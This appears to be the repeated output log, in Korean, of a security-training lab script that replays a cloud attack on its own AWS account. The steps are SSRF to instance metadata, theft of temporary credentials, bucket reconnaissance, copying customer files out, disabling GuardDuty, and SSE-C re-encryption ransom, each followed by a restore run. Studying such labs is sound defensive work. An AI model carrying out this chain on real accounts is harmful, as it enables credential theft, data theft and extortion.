[01:09:52] INFO        → 이후 6·7 은 이 키로 실행 — CloudTrail 에 principal 이 바뀌어 찍힌다
[01:09:53] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[01:09:53] INFO  ================================================================
[01:09:53] INFO    STEP 6 — GuardDuty 비활성화(T1562.008)
[01:09:53] INFO  ================================================================
[01:09:53] WARNING   [!] detector=2daa4601845647bc8ea3e66f821d8401 를 Enable=False 로 전환 시도
[01:09:53] WARNING   [+] GuardDuty 비활성화 성공 — 탐지가 실제로 멈췄다.
[01:09:53] WARNING       복구(필수): aws guardduty update-detector --detector-id 2daa4601845647bc8ea3e66f821d8401 --enable --region ap-northeast-2
[01:09:53] INFO  ================================================================
[01:09:53] INFO    STEP 7 — SSE-C 재암호화 랜섬(T1486)
[01:09:53] INFO  ================================================================
[01:09:53] INFO    [+] 버킷 버저닝 상태 = Disabled
[01:09:53] WARNING   [!] 버저닝 미활성 — 이전 버전 롤백 경로가 없다.
[01:09:53] WARNING       복구는 recovery/ssec.key 에 전적으로 의존한다. 이 파일을 잃지 말 것.
[01:09:54] INFO    [+] 재암호화 대상 3개 (s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/)
[01:09:54] INFO        - whs-data/config.json
[01:09:54] INFO        - whs-data/customers.csv
[01:09:54] INFO        - whs-data/flag.txt
[01:09:54] INFO    [+] SSE-C 키 확보(os.urandom(32) 신규 생성) 및 로컬 저장·검증 완료
[01:09:54] INFO        키 파일 : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key
[01:09:54] INFO        메타    : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key.meta.json (대상 목록·복구 명령 포함)
[01:09:54] INFO        복구    : python scenario1.py --restore
[01:09:54] INFO    [+] 현재 차단된 암호화 유형 = ['SSE-C']
[01:09:54] INFO        변경 전 설정 저장: recovery/bucket_encryption_before.json
[01:09:54] WARNING   [!] SSE-C 차단 해제 시도 (T1562.001) — 버킷 보안 설정 변경
[01:09:54] WARNING   [+] SSE-C 차단 해제 확인됨 — 실습 후 원복 필요(--restore)
[01:09:54] WARNING   [!] 재암호화 시작 — 이후 이 객체들은 키 없이 읽을 수 없다.
[01:09:54] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[01:09:54] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[01:09:54] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[01:09:54] INFO    [=] 재암호화 3개 / 차단 0개
[01:09:54] WARNING       복구: python scenario1.py --restore  (키: recovery/ssec.key)
[01:09:54] INFO  ================================================================
[01:09:54] INFO    SCENARIO 1 종료
[01:09:54] INFO    로그: scenario1/scenario1.log
[01:09:54] INFO  ================================================================
[01:10:40] INFO  ================================================================
[01:10:40] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[01:10:40] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[01:10:40] INFO  ================================================================
[01:10:40] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[01:10:40] INFO  ================================================================
[01:10:40] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[01:10:40] INFO  ================================================================
[01:10:40] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[01:10:40] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[01:10:40] INFO        Expiration=2026-09-29T22:15:48Z
[01:10:40] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-0fcdfe3b2fcb3ebe4
[01:10:41] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[01:10:41] INFO  ================================================================
[01:10:41] INFO    RESTORE — SSE-C 재암호화 원상복구
[01:10:41] INFO  ================================================================
[01:10:41] INFO    [+] 저장된 SSE-C 키 로드: recovery/ssec.key
[01:10:41] INFO    [+] 암호화 기록에서 대상 3개 확인
[01:10:42] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[01:10:42] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[01:10:42] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[01:10:42] INFO    [=] 복구 3개 / 실패 0개
[01:10:42] INFO    [+] 버킷 암호화 설정 원복 완료 (SSE-C 차단 복원)
[01:10:42] INFO  ================================================================
[01:10:42] INFO    SCENARIO 1 복구 종료
[01:10:42] INFO    로그: scenario1/scenario1.log
[01:10:42] INFO  ================================================================
[01:13:36] INFO  ================================================================
[01:13:36] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[01:13:36] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[01:13:36] INFO  ================================================================
[01:13:37] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[01:13:37] INFO  ================================================================
[01:13:37] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[01:13:37] INFO  ================================================================
[01:13:37] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[01:13:37] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[01:13:37] INFO        Expiration=2026-09-29T22:15:48Z
[01:13:37] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-0fcdfe3b2fcb3ebe4
[01:13:37] INFO  ================================================================
[01:13:37] INFO    STEP 3 — 정찰(T1580): S3/STS/IAM 리소스 열거
[01:13:37] INFO  ================================================================
[01:13:38] INFO    [+] sts:GetCallerIdentity Arn=arn:aws:sts::896986966760:assumed-role/cloud9-infra-attack-ec2-role/i-0fcdfe3b2fcb3ebe4
[01:13:38] INFO    [+] s3:ListAllMyBuckets — 15개
[01:13:38] INFO        - cloud9-attack-profile-a396cc5b
[01:13:38] INFO        - cloud9-attack-target-a396cc5b
[01:13:38] INFO        - cloud9-security-896986966760-ap-northeast-2-cloudtrail
[01:13:38] INFO        - cloud9-security-normalized-logs-896986966760-ap-northeast-2-an
[01:13:38] INFO        - cloud943-attack-tfstate
[01:13:38] INFO        - hitl-dashboard-reports-5c7d05592bb4b3dfddcf6026b8
[01:13:38] INFO        - whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an
[01:13:38] INFO        - whs-elk-s3-artifacts-896986966760-ap-northeast-2
[01:13:38] INFO        - whs-elk-s3-investigation-results-896986966760-ap-northeast-2
[01:13:38] INFO        - whs-elk-s3-raw-896986966760-ap-northeast-2
[01:13:38] INFO        - whs-elk-s3-snapshots-896986966760-ap-northeast-2
[01:13:38] INFO        - whs-ir-test-cloudtrail-20260924
[01:13:38] INFO        - whs-ir-test-target-20260924
[01:13:38] INFO        - whs-ssrf-tfstate-896986966760
[01:13:38] INFO        - whs-weekly-report-bucket
[01:13:39] INFO    [expected] iam:ListUsers → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[01:13:39] INFO  ================================================================
[01:13:39] INFO    STEP 4 — S3 데이터 수집·유출(T1530/T1537)
[01:13:39] INFO  ================================================================
[01:13:40] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv (3292 bytes) → exfiltrated/customers.csv
[01:13:40] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json (155 bytes) → exfiltrated/config.json
[01:13:40] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt (48 bytes) → exfiltrated/flag.txt
[01:13:40] INFO    [=] 유출 3/3 파일
[01:13:40] INFO  ================================================================
[01:13:40] INFO    STEP 5 — 장기 자격증명(AKIA) 확보
[01:13:40] INFO  ================================================================
[01:13:40] INFO    [+] config.json 탈취 — 내부 장기 자격증명(더미) AccessKeyId=AKIAFA…(20자)
[01:13:40] INFO    [+] 장기 자격증명 확보: AccessKeyId=AKIA5B…(20자)
[01:13:40] INFO        → 임시키 만료(역할 최대 세션 1시간) 후에도 접근이 유지되는 지속성 확보
[01:13:40] INFO        → 이후 6·7 은 이 키로 실행 — CloudTrail 에 principal 이 바뀌어 찍힌다
[01:13:41] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[01:13:41] INFO  ================================================================
[01:13:41] INFO    STEP 6 — GuardDuty 비활성화(T1562.008)
[01:13:41] INFO  ================================================================
[01:13:41] WARNING   [!] detector=2daa4601845647bc8ea3e66f821d8401 를 Enable=False 로 전환 시도
[01:13:41] WARNING   [+] GuardDuty 비활성화 성공 — 탐지가 실제로 멈췄다.
[01:13:41] WARNING       복구(필수): aws guardduty update-detector --detector-id 2daa4601845647bc8ea3e66f821d8401 --enable --region ap-northeast-2
[01:13:41] INFO  ================================================================
[01:13:41] INFO    STEP 7 — SSE-C 재암호화 랜섬(T1486)
[01:13:41] INFO  ================================================================
[01:13:42] INFO    [+] 버킷 버저닝 상태 = Disabled
[01:13:42] WARNING   [!] 버저닝 미활성 — 이전 버전 롤백 경로가 없다.
[01:13:42] WARNING       복구는 recovery/ssec.key 에 전적으로 의존한다. 이 파일을 잃지 말 것.
[01:13:42] INFO    [+] 재암호화 대상 3개 (s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/)
[01:13:42] INFO        - whs-data/config.json
[01:13:42] INFO        - whs-data/customers.csv
[01:13:42] INFO        - whs-data/flag.txt
[01:13:42] INFO    [+] SSE-C 키 확보(os.urandom(32) 신규 생성) 및 로컬 저장·검증 완료
[01:13:42] INFO        키 파일 : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key
[01:13:42] INFO        메타    : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key.meta.json (대상 목록·복구 명령 포함)
[01:13:42] INFO        복구    : python scenario1.py --restore
[01:13:42] INFO    [+] 현재 차단된 암호화 유형 = ['SSE-C']
[01:13:42] INFO        변경 전 설정 저장: recovery/bucket_encryption_before.json
[01:13:42] WARNING   [!] SSE-C 차단 해제 시도 (T1562.001) — 버킷 보안 설정 변경
[01:13:42] WARNING   [+] SSE-C 차단 해제 확인됨 — 실습 후 원복 필요(--restore)
[01:13:42] WARNING   [!] 재암호화 시작 — 이후 이 객체들은 키 없이 읽을 수 없다.
[01:13:42] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[01:13:42] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[01:13:42] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[01:13:42] INFO    [=] 재암호화 3개 / 차단 0개
[01:13:42] WARNING       복구: python scenario1.py --restore  (키: recovery/ssec.key)
[01:13:42] INFO  ================================================================
[01:13:42] INFO    SCENARIO 1 종료
[01:13:42] INFO    로그: scenario1/scenario1.log
[01:13:42] INFO  ================================================================
[01:13:42] WARNING 
[01:13:42] WARNING [원상복구 필요]
[01:13:42] WARNING   1) 객체 복구 : python scenario1.py --restore
[01:13:42] WARNING   2) GuardDuty 재활성화 (자동 안 됨, 계정 전체 영향):
[01:13:42] WARNING      aws guardduty update-detector --detector-id 2daa4601845647bc8ea3e66f821d8401 --enable --region ap-northeast-2
[01:14:00] INFO  ================================================================
[01:14:00] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[01:14:00] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[01:14:00] INFO  ================================================================
[01:14:00] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[01:14:00] INFO  ================================================================
[01:14:00] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[01:14:00] INFO  ================================================================
[01:14:00] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[01:14:00] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[01:14:00] INFO        Expiration=2026-09-29T22:15:48Z
[01:14:00] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-0fcdfe3b2fcb3ebe4
[01:14:02] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[01:14:02] INFO  ================================================================
[01:14:02] INFO    RESTORE — SSE-C 재암호화 원상복구
[01:14:02] INFO  ================================================================
[01:14:02] INFO    [+] 저장된 SSE-C 키 로드: recovery/ssec.key
[01:14:02] INFO    [+] 암호화 기록에서 대상 3개 확인
[01:14:02] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[01:14:02] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[01:14:02] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[01:14:02] INFO    [=] 복구 3개 / 실패 0개
[01:14:03] INFO    [+] 버킷 암호화 설정 원복 완료 (SSE-C 차단 복원)
[01:14:03] INFO  ================================================================
[01:14:03] INFO    SCENARIO 1 복구 종료
[01:14:03] INFO    로그: scenario1/scenario1.log
[01:14:03] INFO  ================================================================
[10:00:28] INFO  ================================================================
[10:00:28] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[10:00:28] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[10:00:28] INFO  ================================================================
[10:00:29] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[10:00:29] INFO  ================================================================
[10:00:29] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[10:00:29] INFO  ================================================================
[10:00:29] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[10:00:29] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[10:00:29] INFO        Expiration=2026-09-30T06:54:23Z
[10:00:29] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-0c5e1470f80d20f8c
[10:00:29] INFO  ================================================================
[10:00:29] INFO    STEP 3 — 정찰(T1580): S3/STS/IAM 리소스 열거
[10:00:29] INFO  ================================================================
[10:00:30] INFO    [+] sts:GetCallerIdentity Arn=arn:aws:sts::896986966760:assumed-role/cloud9-infra-attack-ec2-role/i-01f92ed077d78a1a3
[10:00:31] INFO    [+] s3:ListAllMyBuckets — 15개
[10:00:31] INFO        - cloud9-attack-profile-a396cc5b
[10:00:31] INFO        - cloud9-attack-target-a396cc5b
[10:00:31] INFO        - cloud9-security-896986966760-ap-northeast-2-cloudtrail
[10:00:31] INFO        - cloud9-security-normalized-logs-896986966760-ap-northeast-2-an
[10:00:31] INFO        - cloud943-attack-tfstate
[10:00:31] INFO        - hitl-dashboard-reports-5c7d05592bb4b3dfddcf6026b8
[10:00:31] INFO        - whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an
[10:00:31] INFO        - whs-elk-s3-artifacts-896986966760-ap-northeast-2
[10:00:31] INFO        - whs-elk-s3-investigation-results-896986966760-ap-northeast-2
[10:00:31] INFO        - whs-elk-s3-raw-896986966760-ap-northeast-2
[10:00:31] INFO        - whs-elk-s3-snapshots-896986966760-ap-northeast-2
[10:00:31] INFO        - whs-ir-test-cloudtrail-20260924
[10:00:31] INFO        - whs-ir-test-target-20260924
[10:00:31] INFO        - whs-ssrf-tfstate-896986966760
[10:00:31] INFO        - whs-weekly-report-bucket
[10:00:32] INFO    [expected] iam:ListUsers → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[10:00:32] INFO  ================================================================
[10:00:32] INFO    STEP 4 — S3 데이터 수집·유출(T1530/T1537)
[10:00:32] INFO  ================================================================
[10:00:32] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv (3292 bytes) → exfiltrated/customers.csv
[10:00:32] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json (155 bytes) → exfiltrated/config.json
[10:00:32] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt (48 bytes) → exfiltrated/flag.txt
[10:00:32] INFO    [=] 유출 3/3 파일
[10:00:32] INFO  ================================================================
[10:00:32] INFO    STEP 5 — 장기 자격증명(AKIA) 확보
[10:00:32] INFO  ================================================================
[10:00:32] INFO    [+] config.json 탈취 — 내부 장기 자격증명(더미) AccessKeyId=AKIAFA…(20자)
[10:00:32] INFO    [+] 장기 자격증명 확보: AccessKeyId=AKIA5B…(20자)
[10:00:32] INFO        → 임시키 만료(역할 최대 세션 1시간) 후에도 접근이 유지되는 지속성 확보
[10:00:32] INFO        → 이후 6·7 은 이 키로 실행 — CloudTrail 에 principal 이 바뀌어 찍힌다
[10:00:33] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[10:00:33] INFO  ================================================================
[10:00:33] INFO    STEP 6 — GuardDuty 비활성화(T1562.008)
[10:00:33] INFO  ================================================================
[10:00:34] INFO    [+] 변경 전 상태 저장: recovery/guardduty_before.json (before=ENABLED)
[10:00:34] WARNING   [!] detector=2daa4601845647bc8ea3e66f821d8401 를 Enable=False 로 전환 시도
[10:00:34] WARNING   [+] GuardDuty 비활성화 성공 — 탐지가 실제로 멈췄다.
[10:00:34] WARNING       복구(필수): aws guardduty update-detector --detector-id 2daa4601845647bc8ea3e66f821d8401 --enable --region ap-northeast-2
[10:00:34] INFO  ================================================================
[10:00:34] INFO    STEP 7 — SSE-C 재암호화 랜섬(T1486)
[10:00:34] INFO  ================================================================
[10:00:34] INFO    [+] 버킷 버저닝 상태 = Disabled
[10:00:34] WARNING   [!] 버저닝 미활성 — 이전 버전 롤백 경로가 없다.
[10:00:34] WARNING       복구는 recovery/ssec.key 에 전적으로 의존한다. 이 파일을 잃지 말 것.
[10:00:35] INFO    [+] 재암호화 대상 3개 (s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/)
[10:00:35] INFO        - whs-data/config.json
[10:00:35] INFO        - whs-data/customers.csv
[10:00:35] INFO        - whs-data/flag.txt
[10:00:35] INFO    [+] SSE-C 키 확보(os.urandom(32) 신규 생성) 및 로컬 저장·검증 완료
[10:00:35] INFO        키 파일 : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key
[10:00:35] INFO        메타    : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key.meta.json (대상 목록·복구 명령 포함)
[10:00:35] INFO        복구    : python scenario1.py --restore
[10:00:35] INFO    [+] 현재 차단된 암호화 유형 = ['SSE-C']
[10:00:35] INFO        변경 전 설정 저장: recovery/bucket_encryption_before.json
[10:00:35] WARNING   [!] SSE-C 차단 해제 시도 (T1562.001) — 버킷 보안 설정 변경
[10:00:35] WARNING   [+] SSE-C 차단 해제 확인됨 — 실습 후 원복 필요(--restore)
[10:00:35] WARNING   [!] 재암호화 시작 — 이후 이 객체들은 키 없이 읽을 수 없다.
[10:00:35] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[10:00:35] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[10:00:35] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[10:00:35] INFO    [=] 재암호화 3개 / 차단 0개
[10:00:35] WARNING       복구: python scenario1.py --restore  (키: recovery/ssec.key)
[10:00:35] INFO  ================================================================
[10:00:35] INFO    SCENARIO 1 종료
[10:00:35] INFO    로그: scenario1/scenario1.log
[10:00:35] INFO  ================================================================
[10:00:35] WARNING 
[10:00:35] WARNING [원상복구]  python scenario1.py --restore
[10:00:35] WARNING   객체 평문화 + SSE-C 차단 복원 + GuardDuty 재활성화 을 한 번에 수행한다.
[10:01:06] INFO  ================================================================
[10:01:06] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[10:01:06] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[10:01:06] INFO  ================================================================
[10:01:06] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[10:01:06] INFO  ================================================================
[10:01:06] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[10:01:06] INFO  ================================================================
[10:01:06] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[10:01:06] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[10:01:06] INFO        Expiration=2026-09-30T06:54:23Z
[10:01:06] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-0c5e1470f80d20f8c
[10:01:08] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[10:01:08] INFO  ================================================================
[10:01:08] INFO    RESTORE — SSE-C 재암호화 원상복구
[10:01:08] INFO  ================================================================
[10:01:08] INFO    [+] 저장된 SSE-C 키 로드: recovery/ssec.key
[10:01:08] INFO    [+] 암호화 기록에서 대상 3개 확인
[10:01:08] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[10:01:08] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[10:01:08] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[10:01:08] INFO    [=] 복구 3개 / 실패 0개
[10:01:09] INFO    [+] 버킷 암호화 설정 원복 완료 (SSE-C 차단 복원)
[10:01:10] INFO    [+] GuardDuty 재활성화 완료 — Status=ENABLED
[10:01:10] INFO  ================================================================
[10:01:10] INFO    SCENARIO 1 복구 종료
[10:01:10] INFO    로그: scenario1/scenario1.log
[10:01:10] INFO  ================================================================
[10:22:05] INFO  ================================================================
[10:22:05] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[10:22:05] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[10:22:05] INFO  ================================================================
[10:22:06] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[10:22:06] INFO  ================================================================
[10:22:06] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[10:22:06] INFO  ================================================================
[10:22:06] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[10:22:06] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[10:22:06] INFO        Expiration=2026-09-30T07:32:30Z
[10:22:06] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-01f92ed077d78a1a3
[10:22:06] INFO  ================================================================
[10:22:06] INFO    STEP 3 — 정찰(T1580): S3/STS/IAM 리소스 열거
[10:22:06] INFO  ================================================================
[10:22:06] INFO    [+] sts:GetCallerIdentity Arn=arn:aws:sts::896986966760:assumed-role/cloud9-infra-attack-ec2-role/i-0c5e1470f80d20f8c
[10:22:07] INFO    [+] s3:ListAllMyBuckets — 15개
[10:22:07] INFO        - cloud9-attack-profile-a396cc5b
[10:22:07] INFO        - cloud9-attack-target-a396cc5b
[10:22:07] INFO        - cloud9-security-896986966760-ap-northeast-2-cloudtrail
[10:22:07] INFO        - cloud9-security-normalized-logs-896986966760-ap-northeast-2-an
[10:22:07] INFO        - cloud943-attack-tfstate
[10:22:07] INFO        - hitl-dashboard-reports-5c7d05592bb4b3dfddcf6026b8
[10:22:07] INFO        - whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an
[10:22:07] INFO        - whs-elk-s3-artifacts-896986966760-ap-northeast-2
[10:22:07] INFO        - whs-elk-s3-investigation-results-896986966760-ap-northeast-2
[10:22:07] INFO        - whs-elk-s3-raw-896986966760-ap-northeast-2
[10:22:07] INFO        - whs-elk-s3-snapshots-896986966760-ap-northeast-2
[10:22:07] INFO        - whs-ir-test-cloudtrail-20260924
[10:22:07] INFO        - whs-ir-test-target-20260924
[10:22:07] INFO        - whs-ssrf-tfstate-896986966760
[10:22:07] INFO        - whs-weekly-report-bucket
[10:22:08] INFO    [expected] iam:ListUsers → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[10:22:08] INFO  ================================================================
[10:22:08] INFO    STEP 4 — S3 데이터 수집·유출(T1530/T1537)
[10:22:08] INFO  ================================================================
[10:22:08] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv (3292 bytes) → exfiltrated/customers.csv
[10:22:08] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json (155 bytes) → exfiltrated/config.json
[10:22:08] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt (48 bytes) → exfiltrated/flag.txt
[10:22:08] INFO    [=] 유출 3/3 파일
[10:22:08] INFO  ================================================================
[10:22:08] INFO    STEP 5 — 장기 자격증명(AKIA) 확보
[10:22:08] INFO  ================================================================
[10:22:08] INFO    [+] config.json 탈취 — 내부 장기 자격증명(더미) AccessKeyId=AKIAFA…(20자)
[10:22:08] INFO    [+] 장기 자격증명 확보: AccessKeyId=AKIA5B…(20자)
[10:22:08] INFO        → 임시키 만료(역할 최대 세션 1시간) 후에도 접근이 유지되는 지속성 확보
[10:22:08] INFO        → 이후 6·7 은 이 키로 실행 — CloudTrail 에 principal 이 바뀌어 찍힌다
[10:22:09] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[10:22:09] INFO  ================================================================
[10:22:09] INFO    STEP 6 — GuardDuty 비활성화(T1562.008)
[10:22:09] INFO  ================================================================
[10:22:09] INFO    [+] 변경 전 상태 저장: recovery/guardduty_before.json (before=ENABLED)
[10:22:09] WARNING   [!] detector=2daa4601845647bc8ea3e66f821d8401 를 Enable=False 로 전환 시도
[10:22:10] WARNING   [+] GuardDuty 비활성화 성공 — 탐지가 실제로 멈췄다.
[10:22:10] WARNING       복구(필수): aws guardduty update-detector --detector-id 2daa4601845647bc8ea3e66f821d8401 --enable --region ap-northeast-2
[10:22:10] INFO  ================================================================
[10:22:10] INFO    STEP 7 — SSE-C 재암호화 랜섬(T1486)
[10:22:10] INFO  ================================================================
[10:22:10] INFO    [+] 버킷 버저닝 상태 = Disabled
[10:22:10] WARNING   [!] 버저닝 미활성 — 이전 버전 롤백 경로가 없다.
[10:22:10] WARNING       복구는 recovery/ssec.key 에 전적으로 의존한다. 이 파일을 잃지 말 것.
[10:22:10] INFO    [+] 재암호화 대상 3개 (s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/)
[10:22:10] INFO        - whs-data/config.json
[10:22:10] INFO        - whs-data/customers.csv
[10:22:10] INFO        - whs-data/flag.txt
[10:22:10] INFO    [+] SSE-C 키 확보(os.urandom(32) 신규 생성) 및 로컬 저장·검증 완료
[10:22:10] INFO        키 파일 : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key
[10:22:10] INFO        메타    : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key.meta.json (대상 목록·복구 명령 포함)
[10:22:10] INFO        복구    : python scenario1.py --restore
[10:22:10] INFO    [+] 현재 차단된 암호화 유형 = ['SSE-C']
[10:22:10] INFO        변경 전 설정 저장: recovery/bucket_encryption_before.json
[10:22:10] WARNING   [!] SSE-C 차단 해제 시도 (T1562.001) — 버킷 보안 설정 변경
[10:22:10] WARNING   [+] SSE-C 차단 해제 확인됨 — 실습 후 원복 필요(--restore)
[10:22:10] WARNING   [!] 재암호화 시작 — 이후 이 객체들은 키 없이 읽을 수 없다.
[10:22:10] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[10:22:10] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[10:22:10] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[10:22:10] INFO    [=] 재암호화 3개 / 차단 0개
[10:22:10] WARNING       복구: python scenario1.py --restore  (키: recovery/ssec.key)
[10:22:10] INFO  ================================================================
[10:22:10] INFO    SCENARIO 1 종료
[10:22:10] INFO    로그: scenario1/scenario1.log
[10:22:10] INFO  ================================================================
[10:22:10] WARNING 
